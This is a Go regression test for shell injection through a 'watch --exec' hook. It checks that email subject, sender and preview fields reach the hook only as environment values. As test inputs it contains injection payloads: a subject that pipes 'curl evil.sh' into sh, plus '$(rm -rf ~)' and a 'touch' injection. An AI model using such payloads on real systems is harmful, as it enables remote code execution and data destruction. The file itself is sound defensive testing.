package watch

import (
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// Test_cli006_WatchExecNeverHandsAttackerBytesToAShell is the up-front
// regression test for `.feedback/fromClaude/cli/006` — `watch --exec` shell
// injection via a blocklist.
//
// The requirement is STRUCTURAL, not a blocklist audit: the lesson of cli/006
// is that a character blocklist was the wrong shape, so a test that checks the
// old blocklist's entries misses the point. What must hold is that the
// attacker-controlled message fields never reach the OS as part of the command
// string — they arrive as literal environment values, uninterpreted — no matter
// what shell metacharacters they contain. The original defect spliced
// `row.subject` into a `sh -c` string; the fix passes fields via the
// environment and hands the shell only the operator's own (trusted) template.
//
// Expected to SKIP now (BuildHookPlan returns ErrNotImplemented) and to enforce
// itself the instant T6 writes the native command — no edit to this test. See
// the package doc for why the seam predates the code.
func Test_cli006_WatchExecNeverHandsAttackerBytesToAShell(t *testing.T) {
	// The exact injection shape from the finding: metacharacters that a
	// blocklist leaves alive (`;` `|`), plus command substitution and
	// backticks, which are the payloads that turn a subject line into RCE.
	const payload = "x; curl evil.sh|sh $(id) `whoami`"

	fields := HookFields{
		ID:      "e_00000000-0000-4000-8000-000000000000",
		Account: "you@example.com",
		From:    "Str`anger`",
		Subject: payload,
		Preview: "$(rm -rf ~)",
	}
	// A template the operator wrote. It is the ONLY thing a shell may parse.
	template := `notify-send "$BM_SUBJECT"`

	plan, err := BuildHookPlan(template, fields)
	if errors.Is(err, ErrNotImplemented) {
		t.Skipf("cli/006: native `watch --exec` not implemented yet (s08 T6); "+
			"this flips to enforced the moment BuildHookPlan stops returning ErrNotImplemented. got err=%v", err)
	}
	if err != nil {
		t.Fatalf("cli/006: BuildHookPlan returned an unexpected error: %v", err)
	}

	// (1) No attacker byte may appear anywhere in the argv vector handed to the
	// OS — not the command, not any argument. This is the property the old,
	// interpolating design violated.
	argv := append([]string{plan.Command}, plan.Args...)
	for _, tok := range argv {
		for _, field := range []string{fields.Subject, fields.From, fields.Preview} {
			if field != "" && strings.Contains(tok, field) {
				t.Errorf("cli/006: attacker-controlled field %q was interpolated into argv %q — "+
					"fields must reach the hook via the environment, never the command string", field, tok)
			}
		}
		if strings.Contains(tok, "curl evil.sh") {
			t.Errorf("cli/006: injection payload reached argv %q", tok)
		}
	}

	// (2) The operator's template must be present verbatim — nothing spliced
	// in. Whatever wrapping the plan uses to invoke a shell, the template is
	// carried as one intact argv element.
	if !containsExact(plan.Args, template) {
		t.Errorf("cli/006: the operator template %q is not carried verbatim in Args %q — "+
			"the template is trusted input and must pass through untouched", template, plan.Args)
	}

	// (3) The fields must arrive as literal environment values, uninterpreted.
	wantEnv := map[string]string{
		"BM_ID":      fields.ID,
		"BM_ACCOUNT": fields.Account,
		"BM_FROM":    fields.From,
		"BM_SUBJECT": fields.Subject,
	}
	for k, want := range wantEnv {
		if got := plan.Env[k]; got != want {
			t.Errorf("cli/006: env %s = %q, want the literal field %q", k, got, want)
		}
	}
	if got := plan.Env["BM_PREVIEW"]; len(got) > HookPreviewMax {
		t.Errorf("cli/006: BM_PREVIEW is %d bytes, must be truncated to <= %d", len(got), HookPreviewMax)
	}

	// (4) End-to-end through a real shell — the strongest form of the property.
	// A subject engineered to `touch` a file fires ONLY if the shell parses it;
	// with the template referencing the field unquoted, the old code would run
	// it. Prove the file is never created, and that the field is still intact in
	// the environment for a template that asks for it properly.
	t.Run("through a real shell", func(t *testing.T) {
		dir := t.TempDir()
		pwned := filepath.Join(dir, "pwned")
		// Unquoted {subject}: the exact template shape that was RCE.
		tmpl := "printf %s {subject}"
		p, err := BuildHookPlan(tmpl, HookFields{Subject: "x; touch " + pwned})
		if err != nil {
			t.Fatalf("BuildHookPlan: %v", err)
		}
		run := exec.Command(p.Command, p.Args...)
		run.Env = envSlice(p.Env)
		out, runErr := run.Output()
		if runErr != nil {
			t.Fatalf("hook run failed: %v", runErr)
		}
		if _, statErr := os.Stat(pwned); statErr == nil {
			t.Fatalf("cli/006: the hook PARSED the subject and created %s — remote code execution", pwned)
		}
		// The shell saw only the template's own literal `{subject}`.
		if got := strings.TrimSpace(string(out)); got != "{subject}" {
			t.Errorf("cli/006: shell output %q, want the literal %q (no substitution)", got, "{subject}")
		}
	})
}

// containsExact reports whether s appears as a whole element of ss.
func containsExact(ss []string, s string) bool {
	for _, x := range ss {
		if x == s {
			return true
		}
	}
	return false
}

// envSlice renders a plan's env map as the "KEY=VALUE" slice os/exec wants.
func envSlice(env map[string]string) []string {
	out := make([]string, 0, len(env))
	for k, v := range env {
		out = append(out, k+"="+v)
	}
	return out
}
